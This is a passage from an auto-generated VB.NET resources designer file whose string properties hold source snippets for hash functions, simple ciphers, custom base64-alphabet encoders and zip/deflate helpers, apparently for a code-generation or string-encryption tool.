        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property SHA1Hash() As String
            Get
                Return ResourceManager.GetString("SHA1Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function SHA256Hash(ByVal input As String) As String
        '''        Dim SHA256 As New SHA256Managed
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = SHA256.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property SHA256Hash() As String
            Get
                Return ResourceManager.GetString("SHA256Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function SHA348Hash(ByVal input As String) As String
        '''        Dim SHA348 As New SHA384Managed
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = SHA348.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property SHA348Hash() As String
            Get
                Return ResourceManager.GetString("SHA348Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function SHA512Hash(ByVal input As String) As String
        '''        Dim SHA512 As New SHA512Managed
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = SHA512.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property SHA512Hash() As String
            Get
                Return ResourceManager.GetString("SHA512Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function DeCrypt(ByVal Data As String, ByVal key As String) As String
        '''        Return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
        '''    End Function
        '''    Public Shared Function DeCrypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
        '''        For i = (Data.Length * 2) + key.Length To 0 Step -1
        '''            Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor key(i Mod key.Length)) - CInt(Data((i + 1) Mod Data.Length)) [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Stairs___Decrypt__() As String
            Get
                Return ResourceManager.GetString("Stairs___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Crypt(ByVal Data As String, ByVal key As String) As String
        '''        Return Encoding.Default.GetString(Crypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
        '''    End Function
        '''    Public Shared Function Crypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
        '''        For i = 0 To (Data.Length * 2) + key.Length
        '''            Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor key(i Mod key.Length)
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Stairs___Encrypt__() As String
            Get
                Return ResourceManager.GetString("Stairs___Encrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TIGO3FX_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;FrsxyzA8VtuvwDEqWZ/1+4klm67=cBCa5Ybdef0g2hij9nopMNO3GHIRSTJKLPQUX&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TIGO3FX_Decode() As String
            Get
                Return ResourceManager.GetString("TIGO3FX_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TIGO3FX_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;FrsxyzA8VtuvwDEqWZ/1+4klm67=cBCa5Ybdef0g2hij9nopMNO3GHIRSTJKLPQUX&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Ne [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TIGO3FX_Encode() As String
            Get
                Return ResourceManager.GetString("TIGO3FX_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TripleDES_Decrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim TripleDES As New TripleDESCryptoServiceProvider
        '''        Dim Hash_TripleDES As New MD5CryptoServiceProvider
        '''        Dim decrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(23) As Byte
        '''            Dim temp As Byte() = Hash_TripleDES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 16)
        '''            Array.Copy(temp, 0, hash, 15, 8)
        '''            TripleDES.Key =  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TripleDES_Decrypt() As String
            Get
                Return ResourceManager.GetString("TripleDES_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TripleDES_Encrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim TripleDES As New TripleDESCryptoServiceProvider
        '''        Dim Hash_TripleDES As New MD5CryptoServiceProvider
        '''        Dim encrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(23) As Byte
        '''            Dim temp As Byte() = Hash_TripleDES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 16)
        '''            Array.Copy(temp, 0, hash, 15, 8)
        '''            TripleDES.Key =  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TripleDES_Encrypt() As String
            Get
                Return ResourceManager.GetString("TripleDES_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TRIPO5_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;ghijopE+G78lmnIJQRXY=abcS/UVWdefABCs456tDqruvNOPwx2KLyz01M3Hk9ZFT&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''    [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TRIPO5_Decode() As String
            Get
                Return ResourceManager.GetString("TRIPO5_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function TRIPO5_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;ghijopE+G78lmnIJQRXY=abcS/UVWdefABCs456tDqruvNOPwx2KLyz01M3Hk9ZFT&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Nex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TRIPO5_Encode() As String
            Get
                Return ResourceManager.GetString("TRIPO5_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function UnZip_deflate(ByVal compressedText As String) As String
        '''        Dim gzBuffer As Byte() = Convert.FromBase64String(compressedText)
        '''        Using ms As New MemoryStream()
        '''            Dim msgLength As Integer = BitConverter.ToInt32(gzBuffer, 0)
        '''            ms.Write(gzBuffer, 4, gzBuffer.Length - 4)
        '''            Dim buffer As Byte() = New Byte(msgLength - 1) {}
        '''            ms.Position = 0
        '''            Using zip As New DeflateStream(ms, CompressionMode.Decompress)
        '''                [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property UnZip_deflate___Decrypt__() As String
            Get
                Return ResourceManager.GetString("UnZip_deflate___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function UnZip_G(ByVal compressedText As String) As String
        '''        Dim gzBuffer As Byte() = Convert.FromBase64String(compressedText)
        '''        Using ms As New MemoryStream()
        '''            Dim msgLength As Integer = BitConverter.ToInt32(gzBuffer, 0)
        '''            ms.Write(gzBuffer, 4, gzBuffer.Length - 4)
        '''            Dim buffer As Byte() = New Byte(msgLength - 1) {}
        '''            ms.Position = 0
        '''            Using zip As New GZipStream(ms, CompressionMode.Decompress)
        '''                zip.Read [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property UnZip_G____Decrypt__() As String
            Get
                Return ResourceManager.GetString("UnZip_G____Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function VeginereDecrypt(ByVal proj As String, ByVal key As String)
        '''        Dim decryptedText As String = &quot;&quot;
        '''        For i As Integer = 1 To proj.Length
        '''            Dim temp As Integer = AscW(GetChar(proj, i)) - AscW(GetChar(key, i Mod key.Length + 1))
        '''            decryptedText += ChrW(temp)
        '''        Next
        '''        Return decryptedText
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property VeginereDecrypt() As String
            Get
                Return ResourceManager.GetString("VeginereDecrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function Vernam(ByVal system As String, ByVal key As String) As String
        '''        Dim i, isystem, ikey As Integer
        '''        For i = 1 To Len(key)
        '''            ikey = ikey + AscW(Mid(key, i, 1))
        '''        Next i
        '''        For i = 1 To Len(system)
        '''            isystem = AscW(Mid(system, i, 1)) - ikey Mod 5555
        '''            Vernam = Vernam &amp; ChrW(isystem)
        '''        Next i
        '''
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property Vernam___Decrypt__() As String
            Get
                Return ResourceManager.GetString("Vernam___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function x(system As String, key As String) As String
        '''        Dim num As Integer = Strings.Len(key)
        '''        &apos; The following expression was wrapped in a checked-statement
        '''        Dim num2 As Integer
        '''        For i As Integer = 1 To num
        '''            num2 += Strings.AscW(Strings.Mid(key, i, 1))
        '''        Next
        '''        Dim num3 As Integer = Strings.Len(system)
        '''        Dim text As String
        '''        For i As Integer = 1 To num3
        '''            Dim charCode As Integer = Strings.AscW(Strings.Mid(sys [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property vernam_encrypt() As String
            Get
                Return ResourceManager.GetString("vernam_encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Function Vigenere_Cipher(ByVal Text As String, ByVal key As String, ByVal Encrypt As Boolean)
        '''        Dim Result As String = &quot;&quot;
        '''        Dim temp As String = &quot;&quot;
        '''        Dim j As Integer = 0
        '''        For i As Integer = 0 To Text.Length - 1
        '''            If j = key.Length Then
        '''                j = 0
        '''            End If
        '''            If Char.IsLetter(key(j)) Then
        '''                If Text(i) &lt;&gt; &quot; &quot; And Char.IsLetter(Text(i)) Then
        '''                    temp += key(j)
        '''                    j += 1
        '''              [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Vigenere_encrypt() As String
            Get
                Return ResourceManager.GetString("Vigenere_encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function XOR_Decrypt(ByVal Input As String, ByVal pass As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim u As Integer
        '''        For i As Integer = 0 To Input.Length - 1 Step +2
        '''            Dim tmp As String = Chr((&quot;&amp;H&quot; &amp; Input.Substring(i, 2)) Xor Asc(pass(u)))
        '''            out.Append(tmp)
        '''            If u = pass.Length - 1 Then u = 0 Else u = u + 1
        '''        Next
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property XOR_Decrypt() As String
            Get
                Return ResourceManager.GetString("XOR_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function XOR_Encrypt(ByVal Input As String, ByVal pass As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim u As Integer
        '''        For i As Integer = 0 To Input.Length - 1
        '''            Dim tmp As String = Hex(Asc(Input(i)) Xor Asc(pass(u)))
        '''            If tmp.Length = 1 Then tmp = &quot;0&quot; &amp; tmp
        '''            out.Append(tmp)
        '''            If u = pass.Length - 1 Then u = 0 Else u = u + 1
        '''        Next
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property XOR_Encrypt() As String
            Get
                Return ResourceManager.GetString("XOR_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ZARA128_Decode(ByVal input As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim data As String() = Split(input, &quot; &quot;)
        '''        For Each s As String In data
        '''            Dim temp As Integer = s - 1337
        '''            out.Append(Chr(temp))
        '''        Next
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property ZARA128_Decode() As String
            Get
                Return ResourceManager.GetString("ZARA128_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ZARA128_Encode(ByVal input As String) As String
        '''        Dim out As New StringBuilder
        '''        For Each c As Char In input
        '''            Dim temp As Integer = Asc(c) + 1337
        '''            out.Append(temp.ToString &amp; &quot; &quot;)
        '''        Next
        '''        Return out.ToString.Substring(0, out.Length - 1)
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property ZARA128_Encode() As String
            Get
                Return ResourceManager.GetString("ZARA128_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Zip_deflate(ByVal text As String) As String
        '''        Dim buffer As Byte() = Encoding.Unicode.GetBytes(text)
        '''        Dim ms As New MemoryStream()
        '''        Using zip__1 As New DeflateStream(ms, CompressionMode.Compress, True)
        '''            zip__1.Write(buffer, 0, buffer.Length)
        '''        End Using
        '''        ms.Position = 0
        '''        Dim outStream As New MemoryStream()
        '''        Dim compressed As Byte() = New Byte(ms.Length - 1) {}
        '''        ms.Read(compressed, 0, compressed.Length)
        '''     [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Zip_deflate_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("Zip_deflate_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Zip_G(ByVal text As String) As String
        '''        Dim buffer As Byte() = Encoding.Unicode.GetBytes(text)
        '''        Dim ms As New MemoryStream()
        '''        Using zip__1 As New GZipStream(ms, CompressionMode.Compress, True)
        '''            zip__1.Write(buffer, 0, buffer.Length)
        '''        End Using
        '''        ms.Position = 0
        '''        Dim outStream As New MemoryStream()
        '''        Dim compressed As Byte() = New Byte(ms.Length - 1) {}
        '''        ms.Read(compressed, 0, compressed.Length)
        '''        Dim g [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Zip_G_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("Zip_G_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ZONG22_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;ZKj9n+yf0wDVX1s/5YbdxSo=ILaUpPBCHg8uvNO4klm6iJGhQ7eFrWczAMEq3RTt2&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''    [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ZONG22_Decode() As String
            Get
                Return ResourceManager.GetString("ZONG22_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ZONG22_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;ZKj9n+yf0wDVX1s/5YbdxSo=ILaUpPBCHg8uvNO4klm6iJGhQ7eFrWczAMEq3RTt2&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Nex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ZONG22_Encode() As String
            Get
                Return ResourceManager.GetString("ZONG22_Encode", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
